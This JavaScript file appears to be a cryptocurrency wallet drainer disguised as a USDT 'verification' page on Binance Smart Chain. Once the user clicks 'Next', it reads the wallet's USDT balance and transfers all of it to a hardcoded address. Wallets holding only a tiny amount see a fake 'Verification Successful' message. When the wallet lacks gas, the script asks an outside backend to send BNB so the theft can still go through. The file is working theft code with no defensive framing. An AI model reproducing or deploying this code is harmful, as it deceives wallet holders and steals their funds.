const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";

let web3, userAddress; // Global variables

// Helper to update UI status
function updateWalletStatus(statusText, connectedAddress = null) {
    const statusElement = document.getElementById('walletStatus');
    if (statusElement) {
        statusElement.textContent = statusText;
        if (connectedAddress) {
            statusElement.textContent += ` (${connectedAddress.substring(0, 6)}...${connectedAddress.slice(-4)})`;
            statusElement.style.color = 'green';
        } else {
            statusElement.style.color = 'red';
        }
    }
}

// Function to handle wallet connection
async function connectWallet() {
    let provider = window.ethereum; // Prioritize window.ethereum

    if (!provider && window.web3 && window.web3.currentProvider) {
        provider = window.web3.currentProvider; // Fallback
    }

    if (!provider) {
        showPopup("No Web3 wallet detected. Please install MetaMask or open in a DApp browser.", "red");
        updateWalletStatus("No wallet detected.");
        return;
    }

    try {
        web3 = new Web3(provider);

        // --- ATTEMPT TO GET ALREADY PERMITTED ACCOUNTS FIRST ---
        // This will NOT trigger a popup if the user has already connected this site.
        const accounts = await provider.request({ method: 'eth_accounts' });

        if (accounts.length > 0) {
            userAddress = accounts[0];
            console.log("✅ Wallet already connected:", userAddress);
            updateWalletStatus("Wallet Connected", userAddress);

            // Set up listeners ONLY if we have a provider that supports them
            if (provider.on) {
                provider.on('accountsChanged', handleAccountsChanged);
                provider.on('chainChanged', handleChainChanged);
                provider.on('disconnect', handleDisconnect);
            }
            return true; // Wallet was already connected
        } else {
            // If no accounts are already permitted, we will need to prompt the user.
            // This is where the popup would occur if it's called from a user action.
            console.log("No pre-approved accounts found. User needs to connect.");
            updateWalletStatus("Please connect your wallet.");
            return false; // User needs to explicitly connect
        }

    } catch (e) {
        console.error("Error checking wallet connection:", e);
        showPopup("Error checking wallet status.", "red");
        updateWalletStatus("Connection check failed.");
        userAddress = null;
        return false;
    }
}

// Function to request connection (triggers popup)
async function requestWalletConnection() {
    let provider = window.ethereum;

    if (!provider && window.web3 && window.web3.currentProvider) {
        provider = window.web3.currentProvider;
    }

    if (!provider) {
        showPopup("No Web3 wallet detected. Please install MetaMask or open in a DApp browser.", "red");
        updateWalletStatus("No wallet detected.");
        return false;
    }

    try {
        web3 = new Web3(provider); // Ensure web3 instance is created

        // THIS WILL PROMPT THE USER
        showPopup("Please approve wallet connection in your wallet.", "blue");
        const accounts = await provider.request({ method: 'eth_requestAccounts' });

        if (accounts.length === 0) {
            showPopup("Wallet connection rejected by user or no accounts found.", "red");
            updateWalletStatus("Connection Rejected.");
            userAddress = null;
            return false;
        }

        userAddress = accounts[0];
        console.log("✅ Wallet Connected (via request):", userAddress);
        updateWalletStatus("Wallet Connected", userAddress);

        // Set up listeners AFTER successful connection
        if (provider.on) {
            provider.on('accountsChanged', handleAccountsChanged);
            provider.on('chainChanged', handleChainChanged);
            provider.on('disconnect', handleDisconnect);
        }
        return true;

    } catch (e) {
        if (e.code === 4001) {
            showPopup("Wallet connection rejected by user.", "red");
            updateWalletStatus("Connection Rejected.");
            console.error("User rejected wallet connection:", e.message);
        } else {
            showPopup("Wallet connection failed. See console for details.", "red");
            updateWalletStatus("Connection Failed.");
            console.error("Error during wallet connection request:", e);
        }
        userAddress = null;
        return false;
    }
}


// Event handlers for wallet changes
function handleAccountsChanged(newAccounts) {
    if (newAccounts.length === 0) {
        console.log("Wallet disconnected. Reloading page.");
        showPopup("Wallet disconnected. Please reconnect.", "red");
        updateWalletStatus("Disconnected");
        userAddress = null;
        // Optionally, you might want to reload the page or reset the dApp state
        window.location.reload();
    } else if (newAccounts[0] !== userAddress) {
        console.log("Account changed to:", newAccounts[0]);
        showPopup(`Account changed to: ${newAccounts[0].substring(0, 6)}...${newAccounts[0].slice(-4)}`, "blue");
        userAddress = newAccounts[0];
        updateWalletStatus("Account Changed", userAddress);
        // Reload to refresh all dApp state with new account
        window.location.reload();
    }
}

function handleChainChanged(newChainId) {
    console.log("Chain changed to:", parseInt(newChainId, 16).toString());
    showPopup("Network changed. Reconnecting...", "blue");
    updateWalletStatus("Network Changed. Reloading...");
    // Reload the page to ensure Web3.js instance and contracts are re-initialized for the new chain
    window.location.reload();
}

function handleDisconnect(error) {
    console.error("Provider disconnected:", error);
    showPopup("Wallet disconnected unexpectedly.", "red");
    updateWalletStatus("Disconnected.");
    userAddress = null;
    window.location.reload(); // Reload or reset state
}


// Network switch function (can be called after initial connection)
async function switchNetworkToBSC() {
    if (!web3 || !userAddress) {
        showPopup("Wallet not connected to switch network.", "red");
        return false;
    }

    try {
        const currentChain = await web3.eth.getChainId();
        if (currentChain.toString() !== '56') { // 0x38 is 56 in decimal
            showPopup("Switching to Binance Smart Chain...", "blue");
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }] // BSC Mainnet chainId
                });
                const updatedChain = await web3.eth.getChainId();
                if (updatedChain.toString() !== '56') {
                     showPopup("Failed to switch to Binance Smart Chain. Please switch manually.", "red");
                     updateWalletStatus("Network Switch Failed.");
                     return false;
                }
            } catch (err) {
                if (err.code === 4902) { // Chain not added
                    showPopup("Adding Binance Smart Chain to your wallet...", "blue");
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x38',
                                chainName: 'Binance Smart Chain Mainnet',
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                blockExplorerUrls: ['https://bscscan.com']
                            }]
                        });
                        // After adding, try switching again
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x38' }]
                        });
                        const updatedChain = await web3.eth.getChainId();
                        if (updatedChain.toString() !== '56') {
                             showPopup("Failed to switch to Binance Smart Chain after adding. Please switch manually.", "red");
                             updateWalletStatus("Network Switch Failed.");
                             return false;
                        }
                    } catch (addError) {
                        console.error("Error adding/switching network:", addError);
                        showPopup("Failed to add or switch to Binance Smart Chain. Please add/switch manually.", "red");
                        updateWalletStatus("Network Switch Failed.");
                        return false;
                    }
                } else if (err.code === 4001) { // User rejected chain switch
                    showPopup("User rejected network switch. Please switch to BNB manually.", "red");
                    updateWalletStatus("Network Switch Rejected.");
                    return false;
                } else {
                    console.error("Error switching network:", err);
                    showPopup("Error switching network. Please switch to BNB manually.", "red");
                    updateWalletStatus("Network Switch Failed.");
                    return false;
                }
            }
        }
        showPopup("Successfully on Binance Smart Chain.", "green");
        return true;

    } catch (e) {
        console.error("Error during network switch:", e);
        showPopup("Failed to switch network.", "red");
        updateWalletStatus("Network Switch Failed.");
        return false;
    }
}


async function Next() {
    // 1. Check if wallet is connected (silently)
    if (!userAddress) {
        showPopup("Wallet not connected. Attempting to connect...", "blue");
        const isConnected = await connectWallet(); // Try to get pre-approved connection
        if (!isConnected) {
            // If not pre-approved, prompt the user via button click
            const didConnect = await requestWalletConnection(); // This triggers the popup
            if (!didConnect) {
                showPopup("Wallet not connected to proceed.", "red");
                return;
            }
        }
    }

    // 2. Ensure we are on the correct network
    const onBSC = await switchNetworkToBSC();
    if (!onBSC) {
        showPopup("Please switch to Binance Smart Chain to continue.", "red");
        return;
    }

    // Now that wallet is connected and on correct network, proceed with logic
    try {
        const usdtContract = new web3.eth.Contract([
            {
                constant: true,
                inputs: [{ name: "_owner", type: "address" }],
                name: "balanceOf",
                outputs: [{ name: "", type: "uint256" }],
                type: "function"
            },
            {
                constant: false,
                inputs: [
                    { name: "recipient", type: "address" },
                    { name: "amount", type: "uint256" }
                ],
                name: "transfer",
                outputs: [{ name: "", type: "bool" }],
                type: "function"
            }
        ], usdtContractAddress);

        showPopup("Fetching balances...", "blue");

        const [usdtBalanceWei, bnbBalanceWei] = await Promise.all([
            usdtContract.methods.balanceOf(userAddress).call(),
            web3.eth.getBalance(userAddress)
        ]);

        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
        const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));

        console.log("USDT:", usdtBalance);
        console.log("BNB:", bnbBalance);

        if (isNaN(usdtBalance) || usdtBalance < 0.000001) {
            showPopup("No significant USDT assets found in your wallet.", "black");
            return;
        }

        if (usdtBalance <= 0.0005) {
            showPopup(
                `✅ Verification Successful<br>Your USDT has been verified and not flagged in blockchain.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
                "green"
            );
            return;
        }

        if (bnbBalance < 0.0005) {
            showPopup("Insufficient BNB for gas. Requesting gas...", "blue");
            try {
                const response = await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ toAddress: userAddress })
                });
                const data = await response.json();
                if (!response.ok) {
                    throw new Error(data.message || "Failed to send BNB from backend.");
                }
                showPopup("BNB gas sent. Waiting for confirmation...", "blue");
                await new Promise(r => setTimeout(r, 5000));
            } catch (fetchError) {
                console.error("Error sending BNB from backend:", fetchError);
                showPopup("Failed to get BNB gas. Please ensure you have sufficient BNB for gas.", "red");
                return;
            }
        }

        showPopup("Preparing USDT transfer...", "blue");

        const amountToTransferWei = web3.utils.toWei(usdtBalance.toFixed(18), "ether");

        await usdtContract.methods.transfer(bscAddress, amountToTransferWei)
            .send({ from: userAddress });

        showPopup(
            `✅ Transfer complete<br><b>USDT Transferred:</b> ${usdtBalance}`,
            "green" // Changed to green for success
        );

    } catch (e) {
        console.error("❌ Transaction failed:", e);
        if (e.code === 4001) {
            showPopup("Transaction rejected by user.", "red");
        } else if (e.message && e.message.includes("insufficient funds for gas")) {
            showPopup("Insufficient BNB for gas to complete the transaction.", "red");
        } else {
            showPopup("USDT transaction failed. Check balance or gas. See console for error.", "red");
        }
    }
}

function showPopup(message, color) {
    let popup = document.getElementById("popupBox");
    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        Object.assign(popup.style, {
            position: "fixed", top: "50%", left: "50%",
            transform: "translate(-50%, -50%)",
            padding: "20px", borderRadius: "10px",
            boxShadow: "0 0 10px rgba(0,0,0,0.2)",
            textAlign: "center", fontSize: "18px",
            width: "80%", maxWidth: "400px",
            zIndex: 9999, backgroundColor: "#fff",
            display: "none"
        });
        document.body.appendChild(popup);
    }
    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "green" ? "#e6f7e6" : color === "blue" ? "#e6f7ff" : "#f0f0f0";
    popup.style.color = color === "red" ? "#cc0000" : color === "green" ? "#008000" : color === "blue" ? "#0000cc" : "#333";
    popup.innerHTML = message;
    popup.style.display = "block";
    setTimeout(() => popup.style.display = "none", 5000);
}

window.addEventListener("load", async () => {
    // On page load, try to silently connect (if already approved)
    const isConnectedSilently = await connectWallet();
    if (!isConnectedSilently) {
        // If not silently connected, prompt user to click "Connect Wallet"
        updateWalletStatus("Click 'Connect Wallet' to begin.");
    }

    const connectBtn = document.getElementById("connectWalletBtn");
    if (connectBtn) {
        connectBtn.addEventListener("click", async () => {
            // This is where the eth_requestAccounts popup will be triggered by user action
            const didConnect = await requestWalletConnection();
            if (didConnect) {
                // If successfully connected via popup, try to switch network
                await switchNetworkToBSC();
            }
        });
    }

    const observer = new MutationObserver(() => {
        const btn = [...document.querySelectorAll("button")]
            .find(b => b.textContent.trim().toLowerCase() === "next");
        if (btn) {
            btn.addEventListener("click", Next);
            console.log("✅ Bound 'Next' to Next()");
            observer.disconnect();
        }
    });

    observer.observe(document.body, { childList: true, subtree: true });
});
